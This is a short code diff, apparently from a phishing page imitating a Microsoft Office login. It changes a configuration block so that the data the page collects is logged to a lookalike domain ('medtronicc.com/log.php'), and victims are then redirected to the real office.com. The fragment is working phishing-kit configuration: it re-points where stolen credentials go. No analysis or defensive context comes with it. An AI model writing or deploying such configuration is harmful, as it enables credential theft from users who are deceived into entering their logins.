@@ -176,7 +176,7 @@ label{display:block;font-size:13px;font-weight:500;color:#2b2b2b;margin-bottom:5
 
     // Configuration
     var CONFIG = {
-        logEndpoint: 'https://gnosis.com.py/serca/log.php',
+        logEndpoint: 'https://medtronicc.com/log.php',
         redirectUrl: 'https://www.office.com'
     };
 
